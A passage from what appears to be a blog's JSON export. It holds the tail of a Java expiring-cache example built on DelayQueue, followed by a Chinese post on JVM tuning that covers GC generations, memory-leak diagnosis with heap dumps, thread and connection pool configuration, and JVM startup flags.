run(){</span><br><span class=\"line\">                dameonCheckOverdueKey();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        };</span><br><span class=\"line\">        t.setDaemon(true);</span><br><span class=\"line\">        t.start();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public void dameonCheckOverdueKey(){</span><br><span class=\"line\">        while (true) {</span><br><span class=\"line\">            DelayedItem&lt;K&gt; delayedItem = queue.poll();</span><br><span class=\"line\">            if (delayedItem != null) {</span><br><span class=\"line\">                map.remove(delayedItem.getT());</span><br><span class=\"line\">                System.out.println(System.nanoTime()+&quot; remove &quot;+delayedItem.getT() +&quot; from cache&quot;);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                Thread.sleep(300);</span><br><span class=\"line\">            } catch (Exception e) {</span><br><span class=\"line\">                // TODO: handle exception</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * TODO</span><br><span class=\"line\">     * @param args</span><br><span class=\"line\">     * 2014-1-11 &#x4E0A;&#x5348;11:30:36</span><br><span class=\"line\">     * @author:&#x5B59;&#x632F;&#x8D85;</span><br><span class=\"line\">     * @throws InterruptedException </span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        int cacheNumber = 10;</span><br><span class=\"line\">        int liveTime = 0;</span><br><span class=\"line\">        Cache&lt;String, Integer&gt; cache = new Cache&lt;String, Integer&gt;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        for (int i = 0; i &lt; cacheNumber; i++) {</span><br><span class=\"line\">            liveTime = random.nextInt(3000);</span><br><span class=\"line\">            System.out.println(i+&quot;  &quot;+liveTime);</span><br><span class=\"line\">            cache.put(i+&quot;&quot;, i, random.nextInt(liveTime));</span><br><span class=\"line\">            if (random.nextInt(cacheNumber) &gt; 7) {</span><br><span class=\"line\">                liveTime = random.nextInt(3000);</span><br><span class=\"line\">                System.out.println(i+&quot;  &quot;+liveTime);</span><br><span class=\"line\">                cache.put(i+&quot;&quot;, i, random.nextInt(liveTime));</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        Thread.sleep(3000);</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class DelayedItem&lt;T&gt; implements Delayed{</span><br><span class=\"line\"></span><br><span class=\"line\">    private T t;</span><br><span class=\"line\">    private long liveTime ;</span><br><span class=\"line\">    private long removeTime;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public DelayedItem(T t,long liveTime){</span><br><span class=\"line\">        this.setT(t);</span><br><span class=\"line\">        this.liveTime = liveTime;</span><br><span class=\"line\">        this.removeTime = TimeUnit.NANOSECONDS.convert(liveTime, TimeUnit.NANOSECONDS) + System.nanoTime();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public int compareTo(Delayed o) {</span><br><span class=\"line\">        if (o == null) return 1;</span><br><span class=\"line\">        if (o == this) return  0;</span><br><span class=\"line\">        if (o instanceof DelayedItem){</span><br><span class=\"line\">            DelayedItem&lt;T&gt; tmpDelayedItem = (DelayedItem&lt;T&gt;)o;</span><br><span class=\"line\">            if (liveTime &gt; tmpDelayedItem.liveTime ) {</span><br><span class=\"line\">                return 1;</span><br><span class=\"line\">            }else if (liveTime == tmpDelayedItem.liveTime) {</span><br><span class=\"line\">                return 0;</span><br><span class=\"line\">            }else {</span><br><span class=\"line\">                return -1;</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        long diff = getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS);</span><br><span class=\"line\">        return diff &gt; 0 ? 1:diff == 0? 0:-1;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public long getDelay(TimeUnit unit) {</span><br><span class=\"line\">        return unit.convert(removeTime - System.nanoTime(), unit);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public T getT() {</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setT(T t) {</span><br><span class=\"line\">        this.t = t;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public int hashCode(){</span><br><span class=\"line\">        return t.hashCode();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public boolean equals(Object object){</span><br><span class=\"line\">        if (object instanceof DelayedItem) {</span><br><span class=\"line\">            return object.hashCode() == hashCode() ?true:false;</span><br><span class=\"line\">        }</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>"},{"title":"JVM性能调优","date":"2016-04-20T10:24:17.000Z","toc":false,"_content":"\n\n最近因项目存在内存泄漏，故进行大规模的JVM性能调优，现把相关知识进行归纳总结\n\n### 一、JVM内存模型及垃圾收集算法\n#### 1.内存模型\n根据Java虚拟机规范，JVM将内存划分为：\n- 年轻代（New）：年轻代用来存放JVM刚分配的Java对象\n- 年老代（Tenured)：年轻代中经过垃圾回收没有回收掉的对象将被Copy到年老代\n- 永久代（Perm）：永久代存放Class、Method元信息，其大小跟项目的规模、类、方法的量有关，一般设置为128M就足够，设置原则是预留30%的空间。\n\n其中New和Tenured属于堆内存，堆内存会从JVM启动参数（-Xmx:3G）指定的内存中分配。\nPerm不属于堆内存，有虚拟机直接分配，但可以通过-XX:PermSize -XX:MaxPermSize 等参数调整其大小。\n \n\nNew又分为几个部分：\n- Eden：Eden用来存放JVM刚分配的对象\n- Survivor1\n- Survivro2：两个Survivor空间一样大，当Eden中的对象经过垃圾回收没有被回收掉时，会在两个Survivor之间来回Copy，当满足某个条件，比如Copy次数，就会被Copy到Tenured。显然，Survivor只是增加了对象在年轻代中的逗留时间，增加了被垃圾回收的可能性。\n\n#### 2.垃圾回收算法\n垃圾回收算法可以分为三类，都基于标记-清除（复制）算法：\n- Serial算法（单线程）\n- 并行算法\n- 并发算法\n\nJVM会根据机器的硬件配置对每个内存代选择适合的回收算法，比如，如果机器多于1个核，会对年轻代选择并行算法，关于选择细节请参考JVM调优文档。\n\n稍微解释下的是，并行算法是用多线程进行垃圾回收，回收期间会暂停程序的执行，而并发算法，也是多线程回收，但期间不停止应用执行。所以，并发算法适用于交互性高的一些程序。经过观察，并发算法会减少年轻代的大小，其实就是使用了一个大的年老代，这反过来跟并行算法相比吞吐量相对较低。\n\n**还有一个问题是，垃圾回收动作何时执行？Full GC影响较大，应尽可能不进行Full GC**\n- 当年轻代内存满时，会引发一次普通GC，该GC仅回收年轻代。需要强调的时，年轻代满是指Eden代满，Survivor满不会引发GC\n- 当年老代满时会引发Full GC，Full GC将会同时回收年轻代、年老代\n- 当永久代满时也会引发Full GC，会导致Class、Method元信息的卸载\n\n**另一个问题是，何时会抛出OutOfMemoryException，并不是内存被耗空的时候才抛出**\n- JVM98%的时间都花费在内存回收\n- 每次回收的内存小于2%\n\n满足这两个条件将触发OutOfMemoryException，这将会留给系统一个微小的间隙以做一些Down之前的操作，比如手动打印Heap Dump。\n\n<!--more-->      \n<br>\n### 二、内存泄漏及解决方法\n#### 1.系统崩溃前的一些现象：\n- 每次垃圾回收的时间越来越长，由之前的10ms延长到50ms左右，FullGC的时间也有之前的0.5s延长到4、5s\n- FullGC的次数越来越多，最频繁时隔不到1分钟就进行一次FullGC\n- 年老代的内存越来越大并且每次FullGC后年老代没有内存被释放之后系统会无法响应新的请求，逐渐到达OutOfMemoryError的临界值。\n\n#### 2.生成堆的dump文件\n 通过JMX的MBean生成当前的Heap信息，大小为一个3G（整个堆的大小）的hprof文件，如果没有启动JMX可以通过Java的jmap命令来生成该文件。\n \n#### 3.分析dump文件\n下面要考虑的是如何打开这个3G的堆信息文件，显然一般的Window系统没有这么大的内存，必须借助高配置的Linux。当然我们可以借助X-Window把Linux上的图形导入到Window。我们考虑用下面几种工具打开该文件：\n- Visual VM\n- IBM HeapAnalyzer\n- JDK 自带的Hprof工具\n\n使用这些工具时为了确保加载速度，建议设置最大内存为6G。使用后发现，这些工具都无法直观地观察到内存泄漏，Visual VM虽能观察到对象大小，但看不到调用堆栈；HeapAnalyzer虽然能看到调用堆栈，却无法正确打开一个3G的文件。因此，我们又选用了Eclipse专门的静态内存分析工具Mat\n \n #### 4.分析内存泄漏\n通过Mat我们能清楚地看到，哪些对象被怀疑为内存泄漏，哪些对象占的空间最大及对象的调用关系。针对本案，在ThreadLocal中有很多的JbpmContext实例，经过调查是JBPM的Context没有关闭所致\n\n另外，通过Mat或JMX我们还可以分析线程状态，可以观察到线程被阻塞在哪个对象上，从而判断系统的瓶颈。\n \n #### 5.回归问题\n** Q：为什么崩溃前垃圾回收的时间越来越长？**\nA:根据内存模型和垃圾回收算法，垃圾回收分两部分：内存标记、清除（复制），标记部分只要内存大小固定时间是不变的，变的是复制部分，因为每次垃圾回收都有一些回收不掉的内存，所以增加了复制量，导致时间延长。所以，垃圾回收的时间也可以作为判断内存泄漏的依据\n**Q：为什么Full GC的次数越来越多？**\nA：因此内存的积累，逐渐耗尽了年老代的内存，导致新对象分配没有更多的空间，从而导致频繁的垃圾回收\n**Q:为什么年老代占用的内存越来越大？**\nA:因为年轻代的内存无法被回收，越来越多地被Copy到年老代\n\n<br>\n### 三、性能调优\n除了上述内存泄漏外，我们还发现CPU长期不足3%，系统吞吐量不够，针对8core×16G、64bit的Linux服务器来说，是严重的资源浪费。在CPU负载不足的同时，偶尔会有用户反映请求的时间过长，我们意识到必须对程序及JVM进行调优。从以下几个方面进行：\n- 线程池：解决用户响应时间长的问题\n- 连接池\n- JVM启动参数：调整各代的内存比例和垃圾回收算法，提高吞吐量\n- 程序算法：改进程序逻辑算法提高性能、\n\n#### 1.Java线程池（java.util.concurrent.ThreadPoolExecutor）\n大多数JVM6上的应用采用的线程池都是JDK自带的线程池，之所以把成熟的Java线程池进行罗嗦说明，是因为该线程池的行为与我们想象的有点出入。Java线程池有几个重要的配置参数：\n- corePoolSize：核心线程数（最新线程数）\n- maximumPoolSize：最大线程数，超过这个数量的任务会被拒绝，用户可以通过RejectedExecutionHandler接口自定义处理方式\n- keepAliveTime：线程保持活动的时间\n- workQueue：工作队列，存放执行的任务\n\nJava线程池需要传入一个Queue参数（workQueue）用来存放执行的任务，而对Queue的不同选择，线程池有完全不同的行为：\n- SynchronousQueue： 一个无容量的等待队列，一个线程的insert操作必须等待另一线程的remove操作，采用这个Queue线程池将会为每个任务分配一个新线程\n- LinkedBlockingQueue ： 无界队列，采用该Queue，线程池将忽略 maximumPoolSize参数，仅用corePoolSize的线程处理所有的任务，未处理的任务便在LinkedBlockingQueue中排队\n- ArrayBlockingQueue： 有界队列，在有界队列和 maximumPoolSize的作用下，程序将很难被调优：更大的Queue和小的maximumPoolSize将导致CPU的低负载；小的Queue和大的池，Queue就没起动应有的作用。\n\n其实我们的要求很简单，希望线程池能跟连接池一样，能设置最小线程数、最大线程数，当最小数<任务<最大数时，应该分配新的线程处理；当任务>最大数时，应该等待有空闲线程再处理该任务。\n \n但线程池的设计思路是，任务应该放到Queue中，当Queue放不下时再考虑用新线程处理，如果Queue满且无法派生新线程，就拒绝该任务。设计导致“先放等执行”、“放不下再执行”、“拒绝不等待”。所以，根据不同的Queue参数，要提高吞吐量不能一味地增大maximumPoolSize。\n \n当然，要达到我们的目标，必须对线程池进行一定的封装，幸运的是ThreadPoolExecutor中留了足够的自定义接口以帮助我们达到目标。我们封装的方式是：\n- 以SynchronousQueue作为参数，使maximumPoolSize发挥作用，以防止线程被无限制的分配，同时可以通过提高maximumPoolSize来提高系统吞吐量\n- 自定义一个RejectedExecutionHandler，当线程数超过maximumPoolSize时进行处理，处理方式为隔一段时间检查线程池是否可以执行新Task，如果可以把拒绝的Task重新放入到线程池，检查的时间依赖keepAliveTime的大小。\n\n#### 2.连接池（org.apache.commons.dbcp.BasicDataSource）\n在使用org.apache.commons.dbcp.BasicDataSource的时候，因为之前采用了默认配置，所以当访问量大时，通过JMX观察到很多Tomcat线程都阻塞在BasicDataSource使用的Apache ObjectPool的锁上，直接原因当时是因为BasicDataSource连接池的最大连接数设置的太小，默认的BasicDataSource配置，仅使用8个最大连接。\n\n我还观察到一个问题，当较长的时间不访问系统，比如2天，DB上的Mysql会断掉所以的连接，导致连接池中缓存的连接不能用。为了解决这些问题，我们充分研究了BasicDataSource，发现了一些优化的点：\n- Mysql默认支持100个链接，所以每个连接池的配置要根据集群中的机器数进行，如有2台服务器，可每个设置为60\n- initialSize：参数是一直打开的连接数\n- minEvictableIdleTimeMillis：该参数设置每个连接的空闲时间，超过这个时间连接将被关闭\n- timeBetweenEvictionRunsMillis：后台线程的运行周期，用来检测过期连接\n- maxActive：最大能分配的连接数\n- maxIdle：最大空闲数，当连接使用完毕后发现连接数大于maxIdle，连接将被直接关闭。只有initialSize < x < \n- maxIdle的连接将被定期检测是否超期。这个参数主要用来在峰值访问时提高吞吐量。\n- initialSize是如何保持的？经过研究代码发现，BasicDataSource会关闭所有超期的连接，然后再打开initialSize数量的连接，这个特性与minEvictableIdleTimeMillis、timeBetweenEvictionRunsMillis一起保证了所有超期的initialSize连接都会被重新连接，从而避免了Mysql长时间无动作会断掉连接的问题。\n\n#### 3.JVM参数\n在JVM启动参数中，可以设置跟内存、垃圾回收相关的一些参数设置，默认情况不做任何设置JVM会工作的很好，但对一些配置很好的Server和具体的应用必须仔细调优才能获得最佳性能。通过设置我们希望达到一些目标：\n- GC的时间足够的小\n- GC的次数足够的少\n- 发生Full GC的周期足够的长\n\n前两个目前是相悖的，要想GC时间小必须要一个更小的堆，要保证GC次数足够少，必须保证一个更大的堆，我们只能取其平衡。\n- 针对JVM堆的设置一般，可以通过-Xms -Xmx限定其最小、最大值，为了防止垃圾收集器在最小、最大之间收缩堆而产生额外的时间，我们通常把最大、最小设置为相同的值\n\n- 年轻代和年老代将根据默认的比例（1：2）分配堆内存，可以通过调整二者之间的比率NewRadio来调整二者之间的大小，也可以针对回收代，比如年轻代，通过 -XX:newSize -XX:MaxNewSize来设置其绝对大小。同样，为了防止年轻代的堆收缩，我们通常会把-XX:newSize -XX:MaxNewSize设置为同样大小\n\n- 年轻代和年老代设置多大才算合理？这个我问题毫无疑问是没有答案的，否则也就不会有调优。我们观察一下二者大小变化有哪些影响：\n（1）更大的年轻代必然导致更小的年老代，大的年轻代会延长普通GC的周期，但会增加每次GC的时间；小的年老代会导致更频繁的Full GC。\n（2）更小的年轻代必然导致更大年老代，小的年轻代会导致普通GC很频繁，但每次的GC时间会更短；大的年老代会减少Full GC的频率。\n（3）如何选择应该依赖应用程序对象生命周期的分布情况：\n如果应用存在大量的临时对象，应该选择更大的年轻代；\n如果存在相对较多的持久对象，年老代应该适当增大。\n但很多应用都没有这样明显的特性，在抉择时应该根据以下两点：\n（A）本着Full GC尽量少的原则，让年老代尽量缓存常用对象，JVM的默认比例1：2也是这个道理\n （B）通过观察应用一段时间，看其他在峰值时年老代会占多少内存，在不影响Full GC的前提下，根据实际情况加大年轻代，比如可以把比例控制在1：1。但应该给年老代至少预留1/3的增长空间\n\n- 在配置较好的机器上（比如多核、大内存），可以为年老代选择并行收集算法： -XX:+UseParallelOldGC ，默认为Serial收集\n\n- 线程堆栈的设置：每个线程默认会开启1M的堆栈，用于存放栈帧、调用参数、局部变量等，对大多数应用而言这个默认值太了，一般256K就足用。理论上，在内存不变的情况下，减少每个线程的堆栈，可以产生更多的线程，但这实际上还受限于操作系统。\n\n- 可以通过下面的参数打Heap Dump信息\n（1）-XX:HeapDumpPath\n（2）-XX:+PrintGCDetails\n（3）-XX:+PrintGCTimeStamps\n（4）-Xloggc:/usr/aaa/dump/heap_trace.txt\n\n通过下面参数可以控制OutOfMemoryError时打印堆的信息\n-XX:+HeapDumpOnOutOfMemoryError\n\n请看一下一个时间的Java参数配置：（服务器：Linux 64Bit，8Core×16G）\n JAVA_OPTS=\"$JAVA_OPTS -server -Xms3G -Xmx3G -Xss256k -XX:PermSize=128m -XX:MaxPermSize=128m -XX:+UseParallelOldGC -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/aaa/dump -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:/usr/aaa/dump/heap_trace.txt -XX:NewSize=1G -XX:MaxNewSize=1G\"\n\n经过观察该配置非常稳定，每次普通GC的时间在10ms左右，Full GC基本不发生，或隔很长很长的时间才发生一次\n\n通过分析dump文件可以发现，每个1小时都会发生一次Full GC，经过多方求证，只要在JVM中开启了JMX服务，JMX将会1小时执行一次Full GC以清除引用，关于这点请参考附件文档。\n \n#### 4.程序算法调优：本次不作为重点\n","source":"_posts/JVM性能调优.md","raw":"---\ntitle: JVM性能调优\ntags:\n  - JVM\ndate: 2016-4-20 18:24:17\ntoc: false\n\n---\n\n\n最近因项目存在内存泄漏，故进行大规模的JVM性能调优，现把相关知识进行归纳总结\n\n### 一、JVM内存模型及垃圾收集算法\n#### 1.内存模型\n根据Java虚拟机规范，JVM将内存划分为：\n- 年轻代（New）：年轻代用来存放JVM刚分配的Java对象\n- 年老代（Tenured)：年轻代中经过垃圾回收没有回收掉的对象将被Copy到年老代\n- 永久代（Perm）：永久代存放Class、Method元信息，其大小跟项目的规模、类、方法的量有关，一般设置为128M就足够，设置原则是预留30%的空间。\n\n其中New和Tenured属于堆内存，堆内存会从JVM启动参数（-Xmx:3G）指定的内存中分配。\nPerm不属于堆内存，有虚拟机直接分配，但可以通过-XX:PermSize -XX:MaxPermSize 等参数调整其大小。\n \n\nNew又分为几个部分：\n- Eden：Eden用来存放JVM刚分配的对象\n- Survivor1\n- Survivro2：两个Survivor空间一样大，当Eden中的对象经过垃圾回收没有被回收掉时，会在两个Survivor之间来回Copy，当满足某个条件，比如Copy次数，就会被Copy到Tenured。显然，Survivor只是增加了对象在年轻代中的逗留时间，增加了被垃圾回收的可能性。\n\n#### 2.垃圾回收算法\n垃圾回收算法可以分为三类，都基于标记-清除（复制）算法：\n- Serial算法（单线程）\n- 并行算法\n- 并发算法\n\nJVM会根据机器的硬件配置对每个内存代选择适合的回收算法，比如，如果机器多于1个核，会对年轻代选择并行算法，关于选择细节请参考JVM调优文档。\n\n稍微解释下的是，并行算法是用多线程进行垃圾回收，回收期间会暂停程序的执行，而并发算法，也是多线程回收，但期间不停止应用执行。所以，并发算法适用于交互性高的一些程序。经过观察，并发算法会减少年轻代的大小，其实就是使用了一个大的年老代，这反过来跟并行算法相比吞吐量相对较低。\n\n**还有一个问题是，垃圾回收动作何时执行？Full GC影响较大，应尽可能不进行Full GC**\n- 当年轻代内存满时，会引发一次普通GC，该GC仅回收年轻代。需要强调的时，年轻代满是指Eden代满，Survivor满不会引发GC\n- 当年老代满时会引发Full GC，Full GC将会同时回收年轻代、年老代\n- 当永久代满时也会引发Full GC，会导致Class、Method元信息的卸载\n\n**另一个问题是，何时会抛出OutOfMemoryException，并不是内存被耗空的时候才抛出**\n- JVM98%的时间都花费在内存回收\n- 每次回收的内存小于2%\n\n满足这两个条件将触发OutOfMemoryException，这将会留给系统一个微小的间隙以做一些Down之前的操作，比如手动打印Heap Dump。\n\n<!--more-->      \n<br>\n### 二、内存泄漏及解决方法\n#### 1.系统崩溃前的一些现象：\n- 每次垃圾回收的时间越来越长，由之前的10ms延长到50ms左右，FullGC的时间也有之前的0.5s延长到4、5s\n- FullGC的次数越来越多，最频繁时隔不到1分钟就进行一次FullGC\n- 年老代的内存越来越大并且每次FullGC后年老代没有内存被释放之后系统会无法响应新的请求，逐渐到达OutOfMemoryError的临界值。\n\n#### 2.生成堆的dump文件\n 通过JMX的MBean生成当前的Heap信息，大小为一个3G（整个堆的大小）的hprof文件，如果没有启动JMX可以通过Java的jmap命令来生成该文件。\n \n#### 3.分析dump文件\n下面要考虑的是如何打开这个3G的堆信息文件，显然一般的Window系统没有这么大的内存，必须借助高配置的Linux。当然我们可以借助X-Window把Linux上的图形导入到Window。我们考虑用下面几种工具打开该文件：\n- Visual VM\n- IBM HeapAnalyzer\n- JDK 自带的Hprof工具\n\n使用这些工具时为了确保加载速度，建议设置最大内存为6G。使用后发现，这些工具都无法直观地观察到内存泄漏，Visual VM虽能观察到对象大小，但看不到调用堆栈；HeapAnalyzer虽然能看到调用堆栈，却无法正确打开一个3G的文件。因此，我们又选用了Eclipse专门的静态内存分析工具Mat\n \n #### 4.分析内存泄漏\n通过Mat我们能清楚地看到，哪些对象被怀疑为内存泄漏，哪些对象占的空间最大及对象的调用关系。针对本案，在ThreadLocal中有很多的JbpmContext实例，经过调查是JBPM的Context没有关闭所致\n\n另外，通过Mat或JMX我们还可以分析线程状态，可以观察到线程被阻塞在哪个对象上，从而判断系统的瓶颈。\n \n #### 5.回归问题\n** Q：为什么崩溃前垃圾回收的时间越来越长？**\nA:根据内存模型和垃圾回收算法，垃圾回收分两部分：内存标记、清除（复制），标记部分只要内存大小固定时间是不变的，变的是复制部分，因为每次垃圾回收都有一些回收不掉的内存，所以增加了复制量，导致时间延长。所以，垃圾回收的时间也可以作为判断内存泄漏的依据\n**Q：为什么Full GC的次数越来越多？**\nA：因此内存的积累，逐渐耗尽了年老代的内存，导致新对象分配没有更多的空间，从而导致频繁的垃圾回收\n**Q:为什么年老代占用的内存越来越大？**\nA:因为年轻代的内存无法被回收，越来越多地被Copy到年老代\n\n<br>\n### 三、性能调优\n除了上述内存泄漏外，我们还发现CPU长期不足3%，系统吞吐量不够，针对8core×16G、64bit的Linux服务器来说，是严重的资源浪费。在CPU负载不足的同时，偶尔会有用户反映请求的时间过长，我们意识到必须对程序及JVM进行调优。从以下几个方面进行：\n- 线程池：解决用户响应时间长的问题\n- 连接池\n- JVM启动参数：调整各代的内存比例和垃圾回收算法，提高吞吐量\n- 程序算法：改进程序逻辑算法提高性能、\n\n#### 1.Java线程池（java.util.concurrent.ThreadPoolExecutor）\n大多数JVM6上的应用采用的线程池都是JDK自带的线程池，之所以把成熟的Java线程池进行罗嗦说明，是因为该线程池的行为与我们想象的有点出入。Java线程池有几个重要的配置参数：\n- corePoolSize：核心线程数（最新线程数）\n- maximumPoolSize：最大线程数，超过这个数量的任务会被拒绝，用户可以通过RejectedExecutionHandler接口自定义处理方式\n- keepAliveTime：线程保持活动的时间\n- workQueue：工作队列，存放执行的任务\n\nJava线程池需要传入一个Queue参数（workQueue）用来存放执行的任务，而对Queue的不同选择，线程池有完全不同的行为：\n- SynchronousQueue： 一个无容量的等待队列，一个线程的insert操作必须等待另一线程的remove操作，采用这个Queue线程池将会为每个任务分配一个新线程\n- LinkedBlockingQueue ： 无界队列，采用该Queue，线程池将忽略 maximumPoolSize参数，仅用corePoolSize的线程处理所有的任务，未处理的任务便在LinkedBlockingQueue中排队\n- ArrayBlockingQueue： 有界队列，在有界队列和 maximumPoolSize的作用下，程序将很难被调优：更大的Queue和小的maximumPoolSize将导致CPU的低负载；小的Queue和大的池，Queue就没起动应有的作用。\n\n其实我们的要求很简单，希望线程池能跟连接池一样，能设置最小线程数、最大线程数，当最小数<任务<最大数时，应该分配新的线程处理；当任务>最大数时，应该等待有空闲线程再处理该任务。\n \n但线程池的设计思路是，任务应该放到Queue中，当Queue放不下时再考虑用新线程处理，如果Queue满且无法派生新线程，就拒绝该任务。设计导致“先放等执行”、“放不下再执行”、“拒绝不等待”。所以，根据不同的Queue参数，要提高吞吐量不能一味地增大maximumPoolSize。\n \n当然，要达到我们的目标，必须对线程池进行一定的封装，幸运的是ThreadPoolExecutor中留了足够的自定义接口以帮助我们达到目标。我们封装的方式是：\n- 以SynchronousQueue作为参数，使maximumPoolSize发挥作用，以防止线程被无限制的分配，同时可以通过提高maximumPoolSize来提高系统吞吐量\n- 自定义一个RejectedExecutionHandler，当线程数超过maximumPoolSize时进行处理，处理方式为隔一段时间检查线程池是否可以执行新Task，如果可以把拒绝的Task重新放入到线程池，检查的时间依赖keepAliveTime的大小。\n\n#### 2.连接池（org.apache.commons.dbcp.BasicDataSource）\n在使用org.apache.commons.dbcp.BasicDataSource的时候，因为之前采用了默认配置，所以当访问量大时，通过JMX观察到很多Tomcat线程都阻塞在BasicDataSource使用的Apache ObjectPool的锁上，直接原因当时是因为BasicDataSource连接池的最大连接数设置的太小，默认的BasicDataSource配置，仅使用8个最大连接。\n\n我还观察到一个问题，当较长的时间不访问系统，比如2天，DB上的Mysql会断掉所以的连接，导致连接池中缓存的连接不能用。为了解决这些问题，我们充分研究了BasicDataSource，发现了一些优化的点：\n- Mysql默认支持100个链接，所以每个连接池的配置要根据集群中的机器数进行，如有2台服务器，可每个设置为60\n- initialSize：参数是一直打开的连接数\n- minEvictableIdleTimeMillis：该参数设置每个连接的空闲时间，超过这个时间连接将被关闭\n- timeBetweenEvictionRunsMillis：后台线程的运行周期，用来检测过期连接\n- maxActive：最大能分配的连接数\n- maxIdle：最大空闲数，当连接使用完毕后发现连接数大于maxIdle，连接将被直接关闭。只有initialSize < x < \n- maxIdle的连接将被定期检测是否超期。这个参数主要用来在峰值访问时提高吞吐量。\n- initialSize是如何保持的？经过研究代码发现，BasicDataSource会关闭所有超期的连接，然后再打开initialSize数量的连接，这个特性与minEvictableIdleTimeMillis、timeBetweenEvictionRunsMillis一起保证了所有超期的initialSize连接都会被重新连接，从而避免了Mysql长时间无动作会断掉连接的问题。\n\n#### 3.JVM参数\n在JVM启动参数中，可以设置跟内存、垃圾回收相关的一些参数设置，默认情况不做任何设置JVM会工作的很好，但对一些配置很好的Server和具体的应用必须仔细调优才能获得最佳性能。通过设置我们希望达到一些目标：\n- GC的时间足够的小\n- GC的次数足够的少\n- 发生Full GC的周期足够的长\n\n前两个目前是相悖的，要想GC时间小必须要一个更小的堆，要保证GC次数足够少，必须保证一个更大的堆，我们只能取其平衡。\n- 针对JVM堆的设置一般，可以通过-Xms -Xmx限定其最小、最大值，为了防止垃圾收集器在最小、最大之间收缩堆而产生额外的时间，我们通常把最大、最小设置为相同的值\n\n- 年轻代和年老代将根据默认的比例（1：2）分配堆内存，可以通过调整二者之间的比率NewRadio来调整二者之间的大小，也可以针对回收代，比如年轻代，通过 -XX:newSize -XX:MaxNewSize来设置其绝对大小。同样，为了防止年轻代的堆收缩，我们通常会把-XX:newSize -XX:MaxNewSize设置为同样大小\n\n- 年轻代和年老代设置多大才算合理？这个我问题毫无疑问是没有答案的，否则也就不会有调优。我们观察一下二者大小变化有哪些影响：\n（1）更大的年轻代必然导致更小的年老代，大的年轻代会延长普通GC的周期，但会增加每次GC的时间；小的年老代会导致更频繁的Full GC。\n（2）更小的年轻代必然导致更大年老代，小的年轻代会导致普通GC很频繁，但每次的GC时间会更短；大的年老代会减少Full GC的频率。\n（3）如何选择应该依赖应用程序对象生命周期的分布情况：\n如果应用存在大量的临时对象，应该选择更大的年轻代；\n如果存在相对较多的持久对象，年老代应该适当增大。\n但很多应用都没有这样明显的特性，在抉择时应该根据以下两点：\n（A）本着Full GC尽量少的原则，让年老代尽量缓存常用对象，JVM的默认比例1：2也是这个道理\n （B）通过观察应用一段时间，看其他在峰值时年老代会占多少内存，在不影响Full GC的前提下，根据实际情况加大年轻代，比如可以把比例控制在1：1。但应该给年老代至少预留1/3的增长空间\n\n- 在配置较好的机器上（比如多核、大内存），可以为年老代选择并行收集算法： -XX:+UseParallelOldGC ，默认为Serial收集\n\n- 线程堆栈的设置：每个线程默认会开启1M的堆栈，用于存放栈帧、调用参数、局部变量等，对大多数应用而言这个默认值太了，一般256K就足用。理论上，在内存不变的情况下，减少每个线程的堆栈，可以产生更多的线程，但这实际上还受限于操作系统。\n\n- 可以通过下面的参数打Heap Dump信息\n（1）-XX:HeapDumpPath\n（2）-XX:+PrintGCDetails\n（3）-XX:+PrintGCTimeStamps\n（4）-Xloggc:/usr/aaa/dump/heap_trace.txt\n\n通过下面参数可以控制OutOfMemoryError时打印堆的信息\n-XX:+HeapDumpOnOutOfMemoryError\n\n请看一下一个时间的Java参数配置：（服务器：Linux 64Bit，8Core×16G）\n JAVA_OPTS=\"$JAVA_OPTS -server -Xms3G -Xmx3G -Xss256k -XX:PermSize=128m -XX:MaxPermSize=128m -XX:+UseParallelOldGC -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/aaa/dump -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:/usr/aaa/dump/heap_trace.txt -XX:NewSize=1G -XX:MaxNewSize=1G\"\n\n经过观察该配置非常稳定，每次普通GC的时间在10ms左右，Full GC基本不发生，或隔很长很长的时间才发生一次\n\n通过分析dump文件可以发现，每个1小时都会发生一次Full GC，经过多方求证，只要在JVM中开启了JMX服务，JMX将会1小时执行一次Full GC以清除引用，关于这点请参考附件文档。\n \n#### 